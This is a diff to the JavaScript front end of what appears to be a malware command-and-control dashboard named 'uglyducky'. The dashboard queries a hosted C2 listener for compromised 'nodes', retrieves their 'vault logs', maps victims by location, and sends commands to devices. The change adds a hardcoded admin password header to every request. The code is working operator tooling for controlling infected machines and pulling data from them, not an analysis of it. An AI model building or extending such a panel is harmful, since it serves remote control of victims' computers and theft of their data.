@@ -3,6 +3,10 @@
 // --- CONFIGURATION ---
 // ==================================================================
 const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 
+
+// --- NEW SECURITY MEASURE ---
+// This must exactly match the DASHBOARD_PASSWORD in c2_listener.py
+const DASHBOARD_PASSWORD = "ducky_admin_2024"; 
 // ==================================================================
 
 // --- GLOBAL STATE ---
@@ -51,23 +55,28 @@ async function fetchData() {
     btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
 
     try {
-        // --- STEP 1: Fetch Node Profile ---
-        const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`);
+        // --- STEP 1: Fetch Node Profile (NOW WITH SECURE HEADER) ---
+        const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
+            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
+        });
+        if (nodeResponse.status === 401) throw new Error("Unauthorized: Password mismatch.");
         if (nodeResponse.status === 404) throw new Error(`Device ID '${deviceId}' not found.`);
         if (!nodeResponse.ok) throw new Error("API Error fetching node details.");
         
         const nodeData = await nodeResponse.json();
         
-        // --- STEP 2: Update UI with Authenticated Node ---
+        // --- STEP 2: Update UI ---
         activeNodeId = nodeData.id;
         allNodes = [nodeData]; 
         renderNodesList();
         renderMap();
         selectNode(activeNodeId); 
 
-        // --- STEP 3: Fetch Vault Logs ---
+        // --- STEP 3: Fetch Vault Logs (NOW WITH SECURE HEADER) ---
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
-        const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`);
+        const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
+            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
+        });
         if (!logsResponse.ok) throw new Error("API Error fetching vault logs.");
         
         const logsData = await logsResponse.json();
@@ -105,7 +114,10 @@ async function sendCommandToNode(deviceId, command) {
     try {
         const response = await fetch(`${C2_LISTENER_URL}/issue`, {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Dashboard-Password': DASHBOARD_PASSWORD // SECURE HEADER
+            },
             body: JSON.stringify({ device_id: deviceId, command: command })
         });
         if (response.ok) {
@@ -318,9 +330,8 @@ function renderNodesList() {
         let activeLine = '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>';
         let pulse = node.status === 'green' ? 'animate-pulse' : '';
 
-        // Explicit, bulletproof OS Icon matching
         let osLower = (node.os || "").toLowerCase();
-        let osIconClass = 'fa-brands fa-windows text-cyberBlue'; // Default fallback
+        let osIconClass = 'fa-brands fa-windows text-cyberBlue'; 
         
         if (osLower.includes('win')) {
             osIconClass = 'fa-brands fa-windows text-cyberBlue';
@@ -353,7 +364,6 @@ function renderMap() {
     mapDots.innerHTML = '';
     
     allNodes.forEach(node => {
-        // Precise Equirectangular math mapping perfectly to the 100% 100% SVG
         const x = (node.lng + 180) / 3.6;
         const y = (90 - node.lat) / 1.8;
         
